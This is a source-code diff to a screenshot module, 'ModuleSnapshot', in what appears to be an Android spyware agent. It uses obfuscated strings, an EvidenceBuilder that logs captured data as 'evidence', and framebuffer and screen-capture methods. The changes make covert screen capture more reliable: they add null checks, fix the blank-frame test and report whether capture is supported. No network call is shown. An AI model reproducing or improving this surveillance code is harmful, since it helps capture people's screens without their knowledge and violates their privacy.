@@ -72,6 +72,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 	private boolean frameBuffer = true;
 	private boolean screenCap = true;
+	private boolean infoScreenSent = false;
 
 	/*
 	 * (non-Javadoc)
@@ -150,6 +151,10 @@ public class ModuleSnapshot extends BaseInstantModule {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (actualStart) Screenshot not supported");
 					}
+				}
+				if (!infoScreenSent) {
+					EvidenceBuilder.info(M.e("Screenshot ")+ ((!frameBuffer && !screenCap)?M.e("not "):"") +M.e("supported") + M.e(" fb=")+frameBuffer + M.e(" screenCap")+ screenCap ); //$NON-NLS-1$
+					infoScreenSent = true;
 				}
 			} catch (final Exception ex) {
 				if (Cfg.EXCEPTION) {
@@ -240,8 +245,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		}
 
 		try {
-			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
-					.getDefaultDisplay();
+			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
 
 			int width, height, w, h;
 			final int orientation = display.getOrientation();
@@ -321,14 +325,19 @@ public class ModuleSnapshot extends BaseInstantModule {
 					}
 
 					raw = newraw;
-					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 				}
+				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 
 				ByteBuffer buffer = ByteBuffer.wrap(raw);
 				if (buffer == null) {
 					return false;
 				}
-				
+				if(bitmap == null){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (frameBufferMethod): 1) bitmap creation failed");
+					}
+					return false;
+				}
 				bitmap.copyPixelsFromBuffer(buffer);
 				buffer = null;
 				raw = null;
@@ -354,7 +363,12 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 					bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
 				}
-
+				if(bitmap == null){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (frameBufferMethod): 2) bitmap creation failed");
+					}
+					return false;
+				}
 				byte[] jpeg = toJpeg(bitmap);
 				bitmap = null;
 
@@ -374,10 +388,10 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private boolean isBlack(byte[] raw) {
 		for (int i = 0; i < raw.length; i++) {
 			if (raw[i] != 0) {
-				return true;
+				return false;
 			}
 		}
-		return false;
+		return true;
 	}
 
 	private boolean isTablet() {
